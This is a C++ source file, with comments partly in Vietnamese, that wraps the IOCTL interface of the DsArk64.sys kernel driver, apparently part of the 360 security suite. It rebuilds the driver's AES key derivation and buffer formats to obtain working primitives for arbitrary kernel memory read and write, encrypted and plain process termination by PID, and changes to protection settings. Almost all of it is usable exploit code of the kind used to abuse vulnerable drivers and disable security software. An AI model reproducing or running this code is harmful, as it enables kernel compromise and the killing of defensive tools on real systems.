/*
 * dsark64_ioctl.cpp
 *
 * Wrapper cho từng IOCTL của DsArk64.sys.
 * Xử lý toàn bộ encrypt/decrypt, build buffer, gọi DeviceIoControl.
 */

#include "dsark64.h"
#include <stdio.h>

// Declare internal helpers from dsark64_crypto.cpp
uint8_t* BuildKernPrimBuf(DWORD type, uint64_t addr,
                           const uint8_t* data, DWORD dataSize,
                           DWORD* pBufSize);
uint8_t* BuildProtBuf(DWORD command, const WCHAR* path);

// ---------------------------------------------------------------------------
// DsArkOpen — mở device \\.\\DsArk
//
// Prerequisite đã được lo bởi caller (admin + 360 running).
// Driver tự thực hiện SeTokenIsAdmin + 360SelfProtection check trong
// IRP_MJ_CREATE handler; nếu pass thì trả về device handle.
// ---------------------------------------------------------------------------
extern "C" HANDLE DsArkOpen(void)
{
    HANDLE h = CreateFileW(
        DSARK_WIN32_DEVICE,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (h == INVALID_HANDLE_VALUE) {
        // Driver not loaded or prerequisites not met
        return NULL;
    }
    return h;
}

extern "C" void DsArkClose(HANDLE hDev)
{
    if (hDev && hDev != INVALID_HANDLE_VALUE)
        CloseHandle(hDev);
}

// ---------------------------------------------------------------------------
// IOCTL 0x80863000 — Version query
//
// Input:  4-byte output buffer
// Output: DWORD = 0x11000231
// No encryption needed (plain METHOD_BUFFERED, no FsContext use).
// ---------------------------------------------------------------------------
extern "C" DWORD DsArkGetVersion(HANDLE hDev)
{
    DWORD result = 0;
    DWORD bytesReturned = 0;
    DeviceIoControl(hDev, IOCTL_DSARK_VERSION,
                    NULL, 0,
                    &result, sizeof(result),
                    &bytesReturned, NULL);
    return result;
}

// ---------------------------------------------------------------------------
// IOCTL 0x80863080 / 0x80863008 — Simple process kill (raw PID, no crypto)
//
// Input:  DWORD target_pid
// Output: none
// Fails silently if: target == own PID, or target is protected by driver.
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkSimpleKill(HANDLE hDev, DWORD targetPid)
{
    DWORD bytesReturned = 0;
    // Use 0x80863080 (0x80863008 goes to same handler)
    return DeviceIoControl(hDev, IOCTL_DSARK_SIMPLE_KILL_B,
                           &targetPid, sizeof(targetPid),
                           NULL, 0,
                           &bytesReturned, NULL);
}

// ---------------------------------------------------------------------------
// IOCTL 0x80863014 — Clear internal flag (dword_352F4 = 0)
// No input/output.
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkClearFlag(HANDLE hDev)
{
    DWORD bytesReturned = 0;
    DWORD dummy = 0;
    return DeviceIoControl(hDev, IOCTL_DSARK_CLEAR_FLAG,
                           &dummy, sizeof(dummy),
                           NULL, 0,
                           &bytesReturned, NULL);
}

// ---------------------------------------------------------------------------
// IOCTL 0x80863024 — Set protection mode
// Input:  DWORD mode (0 or 1)
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkSetMode(HANDLE hDev, DWORD mode)
{
    if (mode > 1) return FALSE;
    DWORD bytesReturned = 0;
    return DeviceIoControl(hDev, IOCTL_DSARK_SET_MODE,
                           &mode, sizeof(mode),
                           NULL, 0,
                           &bytesReturned, NULL);
}

// ---------------------------------------------------------------------------
// IOCTL 0x80863020 — Kernel address range check
//
// Checks whether a certain kernel address derived inside the driver
// (ObGetObjectType(\Registry\Machine\System) + 0x90) falls within
// the ntoskrnl memory range.
//   result = 0 → address IS inside ntoskrnl range (normal)
//   result = 1 → address is OUTSIDE ntoskrnl range (potential hook/anomaly)
//
// Input:  must have magic DWORD 0x0C080002 at offset 0,
//         then 12 bytes of output space (total >= 0x10)
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkKernAddrCheck(HANDLE hDev, DWORD* pResult)
{
    // Buffer: [magic(4)] [padding(12)] → output overwrites [0..3] with result
    uint8_t buf[0x10] = {0};
    *(DWORD*)buf = KERN_CHECK_MAGIC;

    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDev, IOCTL_DSARK_KERN_CHECK,
                              buf, sizeof(buf),
                              buf, sizeof(buf),
                              &bytesReturned, NULL);
    if (ok && pResult)
        *pResult = *(DWORD*)buf;   // 0 = in range, 1 = outside
    return ok;
}

// ---------------------------------------------------------------------------
// IOCTL 0x8086300C / 0x80863010 — Encrypted process kill
//
// Plaintext format (8 bytes, encrypted with per-PID AES key):
//   [0x00] DWORD caller_pid   (must match kernel's PsGetCurrentProcessId())
//   [0x04] DWORD target_pid
//
// Key derivation: DsArkDeriveKillKey(own_pid) → AES key
// IV: DSARK_KILL_BASE_IV (static)
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkEncKill(HANDLE hDev, DWORD targetPid, BOOL useAltCode)
{
    DWORD ownPid  = GetCurrentProcessId();
    DWORD ioctl   = useAltCode ? IOCTL_DSARK_ENC_KILL_B : IOCTL_DSARK_ENC_KILL;

    // Derive per-PID AES key
    uint8_t derivedKey[16];
    DsArkDeriveKillKey(ownPid, derivedKey);

    // Build plaintext: [own_pid | target_pid | 8 bytes padding to reach 16]
    uint8_t plain[16] = {0};
    *(DWORD*)(plain + 0) = ownPid;
    *(DWORD*)(plain + 4) = targetPid;

    // AES-128-CBC encrypt (input must be >= 8 bytes; we send 16 for alignment)
    uint8_t cipher[16] = {0};
    if (!DsArkAesCbcEncrypt(plain, 16, derivedKey, DSARK_KILL_BASE_IV, cipher))
        return FALSE;

    DWORD bytesReturned = 0;
    return DeviceIoControl(hDev, ioctl,
                           cipher, sizeof(cipher),
                           NULL, 0,
                           &bytesReturned, NULL);
}

// ---------------------------------------------------------------------------
// IOCTL 0x80863028 — Kernel arbitrary READ (single call, max 32 bytes)
//
// addr     : kernel virtual address to read from
// buf      : receives read data
// size     : bytes to read (must be 1..32)
//
// After IOCTL, OutBuffer is the DECRYPTED plaintext with read data at [0x20..].
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkKernRead(HANDLE hDev, uint64_t addr, void* buf, DWORD size)
{
    if (!buf || size == 0 || size > 32) return FALSE;

    DWORD bufSize = 0;
    uint8_t* cipher = BuildKernPrimBuf(KPRIM_READ, addr, NULL, size, &bufSize);
    if (!cipher) return FALSE;

    // Output buffer: we receive the decrypted buffer back
    uint8_t* outBuf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
    if (!outBuf) { HeapFree(GetProcessHeap(), 0, cipher); return FALSE; }

    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDev, IOCTL_DSARK_KERN_PRIM,
                              cipher,  bufSize,
                              outBuf,  bufSize,
                              &bytesReturned, NULL);

    if (ok) {
        // Kernel data is at outBuf[0x20 .. 0x20+size-1]
        // (driver wrote it at payload+16 = plaintext+32 = 0x20)
        memcpy(buf, outBuf + 0x20, size);
    }

    HeapFree(GetProcessHeap(), 0, cipher);
    HeapFree(GetProcessHeap(), 0, outBuf);
    return ok;
}

// ---------------------------------------------------------------------------
// IOCTL 0x80863028 — Kernel arbitrary WRITE (single call, max 512 bytes)
//
// addr     : kernel virtual address to write to
// data     : source data
// size     : bytes to write (1..512)
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkKernWrite(HANDLE hDev, uint64_t addr, const void* data, DWORD size)
{
    if (!data || size == 0 || size > 0x200) return FALSE;

    DWORD bufSize = 0;
    uint8_t* cipher = BuildKernPrimBuf(KPRIM_WRITE, addr,
                                       (const uint8_t*)data, size,
                                       &bufSize);
    if (!cipher) return FALSE;

    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDev, IOCTL_DSARK_KERN_PRIM,
                              cipher,  bufSize,
                              cipher,  bufSize,   // output buffer (ignored for write)
                              &bytesReturned, NULL);

    HeapFree(GetProcessHeap(), 0, cipher);
    return ok;
}

// ---------------------------------------------------------------------------
// Multi-call wrappers — batch read/write across multiple IOCTL calls
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkKernReadEx(HANDLE hDev, uint64_t addr, void* buf, SIZE_T total)
{
    uint8_t* p = (uint8_t*)buf;
    SIZE_T done = 0;
    while (done < total) {
        DWORD chunk = (DWORD)min((SIZE_T)32, total - done);
        if (!DsArkKernRead(hDev, addr + done, p + done, chunk))
            return FALSE;
        done += chunk;
    }
    return TRUE;
}

extern "C" BOOL DsArkKernWriteEx(HANDLE hDev, uint64_t addr, const void* data, SIZE_T total)
{
    const uint8_t* p = (const uint8_t*)data;
    SIZE_T done = 0;
    while (done < total) {
        DWORD chunk = (DWORD)min((SIZE_T)0x200, total - done);
        if (!DsArkKernWrite(hDev, addr + done, p + done, chunk))
            return FALSE;
        done += chunk;
    }
    return TRUE;
}

// ---------------------------------------------------------------------------
// IOCTL 0x80863004 — File path protection
//
// Buffer (0x400 bytes) phải được AES-CBC encrypt với session key.
// Plaintext layout: [checksum(4) | command(4) | pathLen(4) | path(UTF-16)]
// checksum = -sum(all_other_dwords) mod 2^32
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkFileProtect(HANDLE hDev, DWORD cmd, const WCHAR* path)
{
    uint8_t* cipher = BuildProtBuf(cmd, path);
    if (!cipher) return FALSE;

    DWORD bytesReturned = 0;
    // Note: driver requires InBufferSize == 0x400 AND (InBufferSize & 0x3FF) == 0
    //       i.e. InBufferSize must be exactly 0x400
    BOOL ok = DeviceIoControl(hDev, IOCTL_DSARK_FILE_PROT,
                              cipher, PROT_BUF_SIZE,
                              cipher, PROT_BUF_SIZE,
                              &bytesReturned, NULL);

    HeapFree(GetProcessHeap(), 0, cipher);
    return ok;
}

// ---------------------------------------------------------------------------
// IOCTL 0x80863040 — Registry path protection
// Same buffer format as file protection.
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkRegProtect(HANDLE hDev, DWORD cmd, const WCHAR* path)
{
    uint8_t* cipher = BuildProtBuf(cmd, path);
    if (!cipher) return FALSE;

    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDev, IOCTL_DSARK_REG_PROT,
                              cipher, PROT_BUF_SIZE,
                              cipher, PROT_BUF_SIZE,
                              &bytesReturned, NULL);

    HeapFree(GetProcessHeap(), 0, cipher);
    return ok;
}
